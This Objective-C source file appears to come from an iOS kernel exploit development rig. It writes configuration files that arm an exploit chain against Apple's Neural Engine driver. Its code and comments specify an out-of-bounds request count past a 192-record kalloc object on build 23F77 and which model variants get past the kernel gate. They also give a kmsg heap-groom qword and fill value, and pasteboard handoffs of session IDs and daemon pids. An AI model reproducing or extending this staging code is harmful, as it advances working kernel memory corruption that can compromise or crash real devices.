//
//  P146KnobSetter.m — the in-app KNOB FILE SETTER. p146 v2.
//  Lum1na-Debug (P007 rig). iOS kernel research (Lum1na).
//
//  The afc-bypass law: the Documents channel can wedge per device /
//  session (the ApplicationLookupFailed / Permission-denied classes
//  2026-11-01); the app writes its own flags at runtime (the p131
//  stage-3 class), so the tap set = a file utility. v2: the ladder is
//  LINE-PER-KNOB — p146_set.txt's lines feed ALL the composition knobs
//    line 1 -> p142_layers.txt  (the p142/p145/p149 overshoot knob;
//              single-line legacy = this knob only)
//    line 2 -> p147_cycles.txt  (the p147 teardown battery knob)
//    line 3 -> p148_gop.txt     (the p148 blob tap's lawful [0,8] knob)
//    line 4 -> p142_pre.txt     (Prepare-first count, lawful [1,8])
//  Absent lines = each knob's own default (16463/24/2/8). Every write
//  gets the readback VERIFY row. No IOKit, no Metal, no state.
//

#import "P146KnobSetter.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <objc/message.h>

#define P146_BUILD @"p146-knobsetter-v5.8-oobmodel"

@implementation P146KnobSetter

+ (NSString *)tap {
    NSMutableString *out = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    [out appendFormat:@"=== p146 session %@ BUILD %@ ===\n",
        LabLocalMilitaryNow(), P146_BUILD];
    [out appendString:[LabDeviceProfile identBlock]];

    /* the ladder source: line-per-knob (single line = the legacy p142 row) */
    NSString *sets = [docs stringByAppendingPathComponent:@"p146_set.txt"];
    NSArray *lines = [NSArray array];
    if ([NSFileManager.defaultManager fileExistsAtPath:sets]) {
        NSString *s = [NSString stringWithContentsOfFile:sets
            encoding:NSUTF8StringEncoding error:nil];
        lines = [s componentsSeparatedByCharactersInSet:
            [NSCharacterSet newlineCharacterSet]];
    }

    /* {ladder-index (1-based), knob file, default} */
    struct { int line; NSString *file; long def; } rows[4] = {
        { 1, @"p142_layers.txt", 16463 },
        { 2, @"p147_cycles.txt", 24 },
        { 3, @"p148_gop.txt",    2  },
        { 4, @"p142_pre.txt",    8  },
    };
    long got[4] = { -1, -1, -1, -1 };

    [out appendFormat:@"[*] ladder: %@%@ (%@)\n",
        lines.count ? lines[0] : @"(absent)",
        lines.count > 1 ? [NSString stringWithFormat:@", %@",
            [lines[1] length] ? lines[1] : @"-"] : @"",
        @"line-per-knob; single line = the legacy p142 row; absent = defaults"];

    for (int i = 0; i < 4; i++) {
        long val = rows[i].def;
        BOOL fromLadder = NO;
        if (lines.count >= (NSUInteger)rows[i].line) {
            NSString *ln = [lines[rows[i].line - 1]
                stringByTrimmingCharactersInSet:
                [NSCharacterSet whitespaceCharacterSet]];
            if ([ln length]) {
                long v = strtol(ln.UTF8String, NULL, 10);
                if (v > 0) { val = v; fromLadder = YES; }
            }
        }
        /* line 1 leftover 18 (09:06 / 09:55 HOLD) cannot hit the 16463 OOB */
        if (i == 0 && val > 0 && val < 16462) {
            [out appendFormat:@"[heal] line1 %ld is in-bounds leftover — writing 16463\n",
                val];
            val = 16463;
            fromLadder = NO;
        }
        NSString *knob = [docs stringByAppendingPathComponent:rows[i].file];
        NSString *sval = [NSString stringWithFormat:@"%ld\n", val];
        BOOL ok = [sval writeToFile:knob atomically:YES
                            encoding:NSUTF8StringEncoding error:nil];
        NSString *rb = [NSString stringWithContentsOfFile:knob
            encoding:NSUTF8StringEncoding error:nil];
        long rbv = rb ? strtol(rb.UTF8String, NULL, 10) : -1;
        [out appendFormat:@"[%@] line%d -> %@ written=%d readback=%ld"
            @" (%@ %@)\n",
            (rbv == val) ? @"VERIFY" : @"MISMATCH", rows[i].line,
            rows[i].file, ok, rbv,
            fromLadder ? @"from ladder" : @"DEFAULT",
            val == rows[i].def && !fromLadder ? @"value" : @""];
        got[i] = rbv;
    }

    /* v3.2: the P044 v47 knobs (no-push law): p044_model.txt = the
       passthrough marshal class (the post-marshal fill), p044_req_in.txt =
       192 (the 1-record OOB). ABSENT = write the defaults. p044_target.txt
       stays the census's OWN pick (absent = honest census law). */
    NSString *modelPath = [docs stringByAppendingPathComponent:@"p044_model.txt"];
    {   /* v3.4: the model UPGRADE law — a stale non-copyout value is
           replaced, not kept (the in-bounds chosen-write is the only
           route the sid-validation kernel line leaves open). */
        NSString *cur = [[NSString stringWithContentsOfFile:modelPath
            encoding:NSUTF8StringEncoding error:nil] ?: @"" 
            stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
        BOOL isV63 = [cur isEqualToString:@"XVRC27_127in_copyout"];
        BOOL ok = YES;
        if (!isV63) {
            ok = [@"XVRC27_127in_copyout\n" writeToFile:modelPath
                          atomically:YES encoding:NSUTF8StringEncoding error:nil];
            [out appendFormat:@"[%@] p044_model.txt %@ = XVRC27_127in_copyout (upgraded from '%@' — the v63 in-bounds chosen-write; target stays census-owned)\n",
                ok ? @"UPGRADED" : @"FAILED", ok ? @"auto-written" : @"", cur];
        } else {
            [out appendFormat:@"[kept] p044_model.txt = XVRC27_127in_copyout (the v63 config)\n"];
        }
    }
    NSString *reqPath = [docs stringByAppendingPathComponent:@"p044_req_in.txt"];
    if (![NSFileManager.defaultManager fileExistsAtPath:reqPath]) {
        BOOL ok = [@"127\n" writeToFile:reqPath atomically:YES
                        encoding:NSUTF8StringEncoding error:nil];
        [out appendFormat:@"[%@] p044_req_in.txt auto-written = 127 (in-bounds; all sids resolve -> inference RUNS; the copyout model = chosen tiles)\n",
            ok ? @"VERIFY" : @"FAILED"];
    }

    /* v5.5: THE 23F77 43748 CROSSING SWITCH. Pasteboard marker
       "p044_oob=<n>" (193..254) arms the bundled 254-in model AND the
       request in-count in one tap. 23F77 kernel gate allows in+out<=255
       (cve43748_ANE_ProgramSendRequest_count_gate) while the mapRequest
       object is the 192-record 0xC00 object (data.kalloc.3072), so
       records 193..255 are the LIVE OOB write. 24A435 widened the object
       to 255 slots — safe there; run this on the 12 (23F77) ONLY.
       PANIC-POSSIBLE. The marker wins over the v3.4 model upgrade and the
       absent-only req_in default; it touches nothing else.
       v5.6: the arm model is XVRC27_254in_passthrough, NOT addchain —
       v60 (2026-10-12) proved the addchain-254 is rejected on 23F77
       (0x2/0x9 Program Inference error) while passthrough is ACCEPTED and
       reaches the fill. The addchain arm never reached the prewire. */
    {
        id pb = ((id (*)(Class, SEL))objc_msgSend)(
            NSClassFromString(@"UIPasteboard"),
            NSSelectorFromString(@"generalPasteboard"));
        NSString *pbs = pb ? ((NSString *(*)(id, SEL))objc_msgSend)(
            pb, NSSelectorFromString(@"string")) : nil;
        long oob = 0;
        if (pbs.length) {
            NSRange mk = [pbs rangeOfString:@"p044_oob="];
            if (mk.location != NSNotFound) {
                NSUInteger at = mk.location + mk.length;
                NSUInteger e = at;
                while (e < pbs.length) {
                    unichar ch = [pbs characterAtIndex:e];
                    if (ch < '0' || ch > '9') break;
                    e++;
                }
                if (e > at) oob = [[pbs substringWithRange:
                    NSMakeRange(at, e - at)] intValue];
            }
        }
        if (oob >= 193 && oob <= 254) {
            /* v5.8: the arm MODEL is selectable. The 23F77 direct lane
               REJECTS the passthrough 254-in at COMPILE time with
               MaxLiveInLiveOutExceeded (200 live 16 KB ins), so it can
               never carry the OOB request. The addchain-254 DOES compile
               (programHandle 0x7a9e366cf) and its 0x2/0x9 came with
               procIdx=0 - the untested pair is addchain + procIdx=1.
               Default = addchain; "p044_oob_model=passthrough" selects the
               other. */
            NSString *armModel = @"XVRC27_254in_1out_addchain";
            {
                NSRange mk3 = [pbs rangeOfString:@"p044_oob_model="];
                if (mk3.location != NSNotFound) {
                    NSUInteger at3 = mk3.location + mk3.length;
                    NSUInteger e3 = at3;
                    while (e3 < pbs.length) {
                        unichar ch = [pbs characterAtIndex:e3];
                        if (!((ch >= 'A' && ch <= 'Z') || (ch >= 'a' && ch <= 'z')
                              || (ch >= '0' && ch <= '9') || ch == '_')) break;
                        e3++;
                    }
                    if (e3 > at3) {
                        NSString *want = [pbs substringWithRange:
                            NSMakeRange(at3, e3 - at3)];
                        if ([want.lowercaseString containsString:@"pass"])
                            armModel = @"XVRC27_254in_passthrough";
                    }
                }
            }
            BOOL m = [[NSString stringWithFormat:@"%@\n", armModel]
                        writeToFile:modelPath atomically:YES
                        encoding:NSUTF8StringEncoding error:nil];
            BOOL r = [[NSString stringWithFormat:@"%ld\n", oob]
                        writeToFile:reqPath atomically:YES
                        encoding:NSUTF8StringEncoding error:nil];
            /* v5.7: the OOB arm also sets procIdx. On the 17 the law is
               measured: index 0 = kernel reject status=0x2/statusType=0x9,
               any nonzero in-range index (1, 2) = accepted, aned 342 =
               silent client refuse. The 12's 09:51 fire had procIdx=0 and
               returned the SAME 0x2/0x9, so index 0 is the first suspect
               for the reject (the old addchain attribution is confounded).
               Default = 1; an explicit p044_pid=<n> marker on the same
               pasteboard overrides. */
            long idx = 1;
            {
                NSRange mk2 = [pbs rangeOfString:@"p044_pid="];
                if (mk2.location != NSNotFound) {
                    NSUInteger at2 = mk2.location + mk2.length;
                    NSUInteger e2 = at2;
                    while (e2 < pbs.length) {
                        unichar ch = [pbs characterAtIndex:e2];
                        if (ch < '0' || ch > '9') break;
                        e2++;
                    }
                    if (e2 > at2) {
                        long v = [[pbs substringWithRange:
                            NSMakeRange(at2, e2 - at2)] intValue];
                        if (v >= 1 && v <= 100000) idx = v;
                    }
                }
            }
            NSString *idxPath = [docs stringByAppendingPathComponent:
                @"p044_proc_idx.txt"];
            BOOL iok = [[NSString stringWithFormat:@"%ld\n", idx]
                writeToFile:idxPath atomically:YES
                encoding:NSUTF8StringEncoding error:nil];
            [out appendFormat:@"[v5.8] OOB ARM %@: p044_model.txt=%@, p044_req_in.txt=%ld, p044_proc_idx.txt=%ld (23F77 43748 crossing; procIdx nonzero per the measured 0/1/2 law; addchain compiles, passthrough hits MaxLiveInLiveOut at 200 ins; PANIC-POSSIBLE — one tap, fresh boot, 12 only)\n",
                (m && r && iok) ? @"VERIFY" : @"FAILED", armModel, oob, idx];
        } else if (oob != 0) {
            [out appendFormat:@"[v5.6] p044_oob=%ld outside 193..254 — NOT armed (OOB knob only)\n", oob];
        }
    }

    /* v5.1: the per-install split — the SAME binary ships two installs, and
       house_arrest cannot deliver files between them (2026-11-01 law), so
       p146 writes each side's own knob set in-app:
         GUEST install (bundle id contains "guest"): p044_guest.txt = 4b1d
           (the round-1 boundary tile; EVERY tap consumes one copy, so p146
           re-writes it before both the HOLD and the OBSERVE tap).
         STANDALONE install: p044_fill.txt = 5eaf (the user-chosen content
           value; in-place upgrade law) + the sid HANDOFF — if the system
           pasteboard carries a decimal in sid range, p044_target.txt = it
           (absent-only: an existing target is KEPT). */
    BOOL isGuestInstall = [NSBundle.mainBundle.bundleIdentifier.lowercaseString
        containsString:@"guest"];
    if (isGuestInstall) {
        NSString *gPath = [docs stringByAppendingPathComponent:@"p044_guest.txt"];
        BOOL ok = [@"4b1d\n" writeToFile:gPath atomically:YES
                          encoding:NSUTF8StringEncoding error:nil];
        [out appendFormat:@"[%@] p044_guest.txt %@ = 4b1d (GUEST install law: tap p044 next = HOLD; after the standalone's fire tap p146 + p044 again = OBSERVE)\n",
            ok ? @"VERIFY" : @"FAILED", ok ? @"auto-written" : @""];
        /* v5.2: RE-PUT the last GUEST HOLD sid from this install's own p044
           log. The pasteboard is volatile (anything the user copies — e.g.
           tonight's log text — clobbers the raw number), so the guest re-
           stamps it with a marker prefix. Sequence law: tap guest p146 ->
           switch -> tap standalone p146 WITHOUT copying anything between. */
        {
            NSString *logPath = [docs stringByAppendingPathComponent:
                @"p044_aks_kaslr_reach_log.txt"];
            NSString *log = [NSString stringWithContentsOfFile:logPath
                encoding:NSUTF8StringEncoding error:nil];
            uint32_t sidOut = 0;
            if (log) {
                NSRange r = {0, log.length};
                NSRange hit = {NSNotFound, 0};
                /* take the LAST GUEST HOLD match */
                for (long guard = 0; guard < 64; guard++) {
                    NSRange n = [log rangeOfString:@"GUEST HOLD: sid="
                        options:0 range:r];
                    if (n.location == NSNotFound || n.location + n.length >= log.length)
                        break;
                    hit = n;
                    r.location = n.location + n.length;
                    r.length = log.length - r.location;
                }
                if (hit.location != NSNotFound) {
                    NSUInteger at = hit.location + hit.length;
                    NSUInteger end = at;
                    while (end < log.length) {
                        unichar ch = [log characterAtIndex:end];
                        if (ch < '0' || ch > '9') break;
                        end++;
                    }
                    if (end > at)
                        sidOut = (uint32_t)[[log substringWithRange:
                            NSMakeRange(at, end - at)] intValue];
                }
            }
            id pb = ((id (*)(Class, SEL))objc_msgSend)(
                NSClassFromString(@"UIPasteboard"),
                NSSelectorFromString(@"generalPasteboard"));
            if (pb && sidOut) {
                ((void (*)(id, SEL, id))objc_msgSend)(pb,
                    NSSelectorFromString(@"setString:"),
                    [NSString stringWithFormat:@"p044_sid=%u", sidOut]);
                [out appendFormat:@"[v5.2] pasteboard re-set = p044_sid=%u (from this install's own p044 log; standalone p146 consumes it — no clipboard churn between taps)\n", sidOut];
            } else {
                [out appendString:@"[v5.2] no GUEST HOLD sid found in this install's p044 log — hold first (p146+p044), then re-run p146\n"];
            }
        }
    } else {
        /* the STANDALONE must never carry p044_guest.txt — a stray copy
           would turn the standalone's own fire into a GUEST HOLD tap. */
        NSString *gPath = [docs stringByAppendingPathComponent:@"p044_guest.txt"];
        if ([NSFileManager.defaultManager fileExistsAtPath:gPath]) {
            unlink(gPath.fileSystemRepresentation);
            [out appendString:@"[clean] stray p044_guest.txt REMOVED from the standalone (guest-mode guard)\n"];
        }
        NSString *fillPath = [docs stringByAppendingPathComponent:@"p044_fill.txt"];
        NSString *curFill = [[NSString stringWithContentsOfFile:fillPath
            encoding:NSUTF8StringEncoding error:nil] ?: @""
            stringByTrimmingCharactersInSet:
            [NSCharacterSet whitespaceAndNewlineCharacterSet]];
        if (![curFill isEqualToString:@"5eaf"]) {
            BOOL ok = [@"5eaf\n" writeToFile:fillPath atomically:YES
                              encoding:NSUTF8StringEncoding error:nil];
            [out appendFormat:@"[%@] p044_fill.txt %@ = 5eaf %@ (the USER-CHOSEN fill value; uniform 512 B at the output base)\n",
                ok ? @"UPGRADED" : @"FAILED", ok ? @"auto-written" : @"",
                curFill.length ? [NSString stringWithFormat:@"(was '%@')", curFill]
                                : @"(was absent — tonight's 4141..5050 was the code default)"];
        } else {
            [out appendFormat:@"[kept] p044_fill.txt = 5eaf (the chosen fill)\n"];
        }
        /* v5.4: the STAGE-B PID handoff — same pasteboard law as the sid
           handoff. Copy "p044_pid=<n>" anywhere on the device (Universal
           Clipboard from the Mac, or the console), tap p146, and the knob
           p044_proc_idx.txt = <n> is written (absent-only; an existing
           file stays authoritative). The pid is the real daemon pid from
           syslog (e.g. aned[342] -> 342); the 8739b14 consumer validates
           THAT pid's entitlements. */
        {
            NSString *pidPath = [docs stringByAppendingPathComponent:@"p044_proc_idx.txt"];
            if (![NSFileManager.defaultManager fileExistsAtPath:pidPath]) {
                id pb = ((id (*)(Class, SEL))objc_msgSend)(
                    NSClassFromString(@"UIPasteboard"),
                    NSSelectorFromString(@"generalPasteboard"));
                NSString *pbs = pb ? ((NSString *(*)(id, SEL))objc_msgSend)(
                    pb, NSSelectorFromString(@"string")) : nil;
                long pidv = 0;
                if (pbs.length) {
                    NSRange mk = [pbs rangeOfString:@"p044_pid="];
                    NSUInteger at = 0;
                    if (mk.location != NSNotFound) at = mk.location + mk.length;
                    NSUInteger e = at;
                    while (e < pbs.length) {
                        unichar ch = [pbs characterAtIndex:e];
                        if (ch < '0' || ch > '9') break;
                        e++;
                    }
                    if (e > at) pidv = [[pbs substringWithRange:
                        NSMakeRange(at, e - at)] intValue];
                }
                if (pidv >= 1 && pidv <= 100000) {
                    BOOL ok = [[NSString stringWithFormat:@"%ld\n", pidv]
                        writeToFile:pidPath atomically:YES
                                    encoding:NSUTF8StringEncoding error:nil];
                    [out appendFormat:@"[%@] p044_proc_idx.txt %@ = %ld (the [v5.4] pasteboard pid handoff — Stage-B validates THIS pid's entitlements)\n",
                        ok ? @"VERIFY" : @"FAILED", ok ? @"auto-written" : @"", pidv];
                } else {
                    [out appendString:@"[ ] pasteboard has no p044_pid=<n> — p044_proc_idx.txt stays absent (procIdx=0)\n"];
                }
            } else {
                [out appendString:@"[kept] p044_proc_idx.txt present — the user's pid is authoritative\n"];
            }
        }
        /* v5.3: the FGROOM knob auto-write (chain 1). ABSENT-ONLY — the
           groom qword is a user-ownable config, not a one-shot proof value
           (the fill law differs deliberately): if the user wrote their own
           p110_groom.txt, p146 keeps it. */
        {
            NSString *gp = [docs stringByAppendingPathComponent:@"p110_groom.txt"];
            if (![NSFileManager.defaultManager fileExistsAtPath:gp]) {
                BOOL ok = [@"cafe0fedcafe0fed,48\n" writeToFile:gp atomically:YES
                                  encoding:NSUTF8StringEncoding error:nil];
                [out appendFormat:@"[%@] p110_groom.txt %@ = cafe0fedcafe0fed,48 "
                    @"(chain 1 FGROOM default: the p110 reclaim fires "
                    @"kdata-0x1000 kmsgs, chosen qword @ +0x30, in-window)\n",
                    ok ? @"VERIFY" : @"FAILED", ok ? @"auto-written" : @""];
            } else {
                [out appendString:@"[kept] p110_groom.txt present — the user's groom config is authoritative\n"];
            }
        }
        /* the v78 sid handoff: pasteboard decimal in sid range -> the target,
           absent-only (an existing target file is authoritative). */
        NSString *targetPath = [docs stringByAppendingPathComponent:@"p044_target.txt"];
        if (![NSFileManager.defaultManager fileExistsAtPath:targetPath]) {
            id pb = ((id (*)(Class, SEL))objc_msgSend)(
                NSClassFromString(@"UIPasteboard"),
                NSSelectorFromString(@"generalPasteboard"));
            NSString *pbs = pb ? ((NSString *(*)(id, SEL))objc_msgSend)(
                pb, NSSelectorFromString(@"string")) : nil;
            /* v5.2: the [v78] handoff stamps "p044_sid=<n>" — parse the
               marker first, then a bare decimal as the v5.1 fallback. */
            long sidv = 0;
            if (pbs.length) {
                NSRange mk = [pbs rangeOfString:@"p044_sid="];
                if (mk.location != NSNotFound) {
                    NSRange digits = NSMakeRange(mk.location + mk.length, 0);
                    NSUInteger e = digits.location;
                    while (e < pbs.length) {
                        unichar ch = [pbs characterAtIndex:e];
                        if (ch < '0' || ch > '9') break;
                        e++;
                    }
                    digits.length = e - digits.location;
                    if (digits.length)
                        sidv = [[pbs substringWithRange:digits] intValue];
                } else {
                    sidv = strtol(pbs.UTF8String, NULL, 10);
                }
            }
            if (sidv >= 16 && sidv <= 1000000) {
                BOOL ok = [[NSString stringWithFormat:@"%ld\n", sidv]
                    writeToFile:targetPath atomically:YES
                                encoding:NSUTF8StringEncoding error:nil];
                [out appendFormat:@"[%@] p044_target.txt %@ = %ld (the [v78] pasteboard sid handoff — tap this GUEST's p044 within the same boot first)\n",
                    ok ? @"VERIFY" : @"FAILED", ok ? @"auto-written" : @"", sidv];
            } else {
                [out appendFormat:@"[ ] pasteboard not a sid (%@) — p044_target.txt stays census-owned (re-run the guest p146 to re-stamp p044_sid=<n>)\n",
                    pbs.length ? @"non-numeric" : @"empty"];
            }
        } else {
            [out appendFormat:@"[kept] p044_target.txt present — the existing target is authoritative\n"];
        }
    }

    /* the other composition flags' presence (the tap order's state) */
    NSArray *flags = @[ @"p131_stage3.txt", @"p132_land.txt",
                        @"lswkrw_arm.txt", @"p084_mode_massunmap.txt" ];
    for (NSString *f in flags) {
        BOOL present = [[NSFileManager defaultManager]
            fileExistsAtPath:[docs stringByAppendingPathComponent:f]];
        [out appendFormat:@"  flag %@ = %@\n", f, present ? @"SET" : @"-"];
    }

    [out appendFormat:@"[end-state] p142=%ld p147=%ld p148=%ld pre=%ld\n",
        got[0], got[1], got[2], got[3]];
    [out appendFormat:@"=== p146 end %@ ===\n", LabLocalMilitaryNow()];
    return out;
}

@end